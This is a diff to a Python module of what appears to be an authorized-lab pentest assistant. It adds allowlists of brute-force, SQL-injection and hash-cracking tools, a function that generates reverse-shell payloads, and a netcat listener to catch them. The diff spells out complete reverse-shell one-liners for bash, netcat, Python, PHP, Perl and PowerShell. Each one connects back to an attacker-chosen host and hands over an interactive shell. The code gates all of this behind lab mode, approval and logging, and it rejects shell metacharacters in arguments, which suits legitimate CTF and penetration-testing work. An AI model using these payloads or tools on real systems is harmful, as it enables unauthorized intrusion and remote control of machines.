@@ -54,6 +54,50 @@ TOOLS: dict[str, str] = {
     "traceroute": "trace the network path",
 }
 
+# Exploitation tools that AIM AT the target (same gating as recon: target is appended, nothing else).
+# Permitted only against an authorized CTF/owned target, with per-run approval and logging.
+EXPLOIT_TOOLS: dict[str, str] = {
+    "hydra": "brute-force a login service on the target",
+    "medusa": "brute-force logins on the target",
+    "sqlmap": "test/exploit SQL injection on the target",
+    "wfuzz": "fuzz web requests on the target",
+    "patator": "multi-protocol brute-force on the target",
+    "crackmapexec": "enumerate/authenticate against the target (SMB/WinRM/…)",
+}
+TOOLS.update(EXPLOIT_TOOLS)
+
+# LOCAL tools — no remote target (they search/generate/crack locally). Still lab-gated, approved and logged.
+LOCAL_TOOLS: dict[str, str] = {
+    "searchsploit": "search Exploit-DB (offline) for known exploits",
+    "msfvenom": "generate a payload (e.g. a reverse shell) — LHOST is YOUR IP",
+    "john": "crack password hashes you captured (local)",
+    "hashcat": "crack password hashes you captured (local)",
+    "hashid": "identify a hash type",
+    "hash-identifier": "identify a hash type",
+}
+
+# Standard reverse-shell one-liners (as published in PayloadsAllTheThings / pentestmonkey). Pure text —
+# Builder generates them so you can paste one into a foothold on an AUTHORIZED box, and catch it with
+# `lab listen`. {lhost}/{lport} are filled in; nothing is executed here.
+REV_SHELLS: dict[str, str] = {
+    "bash": "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
+    "bash-udp": "sh -i >& /dev/udp/{lhost}/{lport} 0>&1",
+    "nc-mkfifo": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
+    "nc-e": "nc -e /bin/sh {lhost} {lport}",
+    "python3": ("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
+                "s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
+                "os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")'"),
+    "php": "php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+    "perl": ("perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
+             "if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");"
+             "open(STDERR,\">&S\");exec(\"/bin/sh -i\");}'"),
+    "powershell": ("powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();"
+                   "[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
+                   "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);"
+                   "$sb2=$sb+'PS '+(pwd).Path+'> ';$sby=([text.encoding]::ASCII).GetBytes($sb2);"
+                   "$s.Write($sby,0,$sby.Length);$s.Flush()}\""),
+}
+
 # Reject obvious command-injection / chaining attempts in args (we never use a shell, but be strict anyway).
 _BAD_ARG = re.compile(r"[;&|`$><\n]|\$\(")
 # A second host/IP/URL in the args would let a tool be aimed somewhere other than the authorized target.
@@ -122,3 +166,78 @@ def run_tool(cfg, db, tool: str, target: str, args: list[str] | None = None, app
                   reason="authorized-lab recon/enum")
     return {"tool": tool, "target": target, "cmd": cmd, "output": output,
             "seconds": round(time.monotonic() - start, 1)}
+
+
+def run_local_tool(cfg, db, tool: str, args: list[str] | None = None, approve=None, log=print,
+                   timeout: int = 900) -> dict:
+    """Run a LOCAL exploit helper (searchsploit, msfvenom, john, hashcat, hashid) — no remote target.
+
+    Still hard-gated: lab mode ON, the tool on the local allowlist, no shell metacharacters, and the boss
+    approves the run (it's logged). These search/generate/crack locally; they don't reach out on their own.
+    """
+    args = list(args or [])
+    safety = Safety(db, cfg, approver=approve, log=log)
+    safety.guard_lab()
+    if tool not in LOCAL_TOOLS:
+        raise LabToolError(f"{tool!r} isn't a local tool Builder will run. Allowed: "
+                           f"{', '.join(sorted(LOCAL_TOOLS))}.")
+    for a in args:
+        if _BAD_ARG.search(str(a)):
+            raise LabToolError(f"refused unsafe argument {a!r} (no shell metacharacters allowed).")
+    if not tool_available(tool):
+        raise LabToolError(f"'{tool}' isn't installed. Install it first, then try again.")
+    safety.guard_action("offense", detail=f"{tool} {' '.join(args)}".strip(), target="(local)")
+    cmd = [tool, *args]
+    log(f"  running: {' '.join(cmd)}")
+    start = time.monotonic()
+    try:
+        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
+        output = (p.stdout or "") + (("\n[stderr]\n" + p.stderr) if p.stderr else "")
+    except subprocess.TimeoutExpired:
+        output = f"(no result — {tool} ran longer than {timeout}s and was stopped)"
+    except OSError as e:
+        output = f"(couldn't run {tool}: {e})"
+    db.log_safety("offense", "allowed", detail=f"{tool} {' '.join(args)}".strip(), target="(local)",
+                  reason="authorized-lab local tool")
+    return {"tool": tool, "cmd": cmd, "output": output, "seconds": round(time.monotonic() - start, 1)}
+
+
+def make_payload(cfg, db, lhost: str, lport: int, kind: str = "bash", log=print) -> str:
+    """Return a reverse-shell one-liner (pure text) to use on an authorized box. Lab-gated and logged.
+
+    Nothing is executed — this generates the standard command you'd paste into a foothold, pointing back
+    to YOUR listener (``lhost``/``lport``). Catch it with :func:`start_listener`.
+    """
+    safety = Safety(db, cfg, approver=None, log=log)
+    safety.guard_lab()
+    if kind not in REV_SHELLS:
+        raise LabToolError(f"unknown payload type {kind!r}. Available: {', '.join(sorted(REV_SHELLS))}.")
+    if _BAD_ARG.search(str(lhost)) or not str(lport).isdigit():
+        raise LabToolError("lhost/lport look wrong — give your own IP and a numeric port.")
+    payload = REV_SHELLS[kind].format(lhost=lhost, lport=int(lport))
+    db.log_safety("offense", "allowed", detail=f"payload {kind} -> {lhost}:{lport}", target="(local)",
+                  reason="authorized-lab reverse-shell payload generated")
+    return payload
+
+
+def start_listener(cfg, db, port: int, approve=None, log=print) -> None:
+    """Start a netcat listener to catch a reverse shell (interactive, foreground). Lab-gated and logged.
+
+    Blocks until a shell connects or you press Ctrl-C. A local listener — it waits for the box you're
+    exploiting to connect back; it reaches out to nothing.
+    """
+    safety = Safety(db, cfg, approver=approve, log=log)
+    safety.guard_lab()
+    if not str(port).isdigit() or not (1 <= int(port) <= 65535):
+        raise LabToolError("give a numeric port between 1 and 65535.")
+    listener = shutil.which("ncat") or shutil.which("nc")
+    if not listener:
+        raise LabToolError("no netcat found. Install it first (e.g. brew install nmap  → gives 'ncat').")
+    safety.guard_action("offense", detail=f"listen on {port}", target="(local listener)")
+    db.log_safety("offense", "allowed", detail=f"listen on {port}", target="(local listener)",
+                  reason="authorized-lab reverse-shell listener")
+    log(f"  listening on 0.0.0.0:{port} — waiting for a shell (Ctrl-C to stop)…")
+    try:
+        subprocess.run([listener, "-lvnp", str(int(port))])   # interactive: inherits your terminal
+    except KeyboardInterrupt:
+        log("\n  listener stopped.")
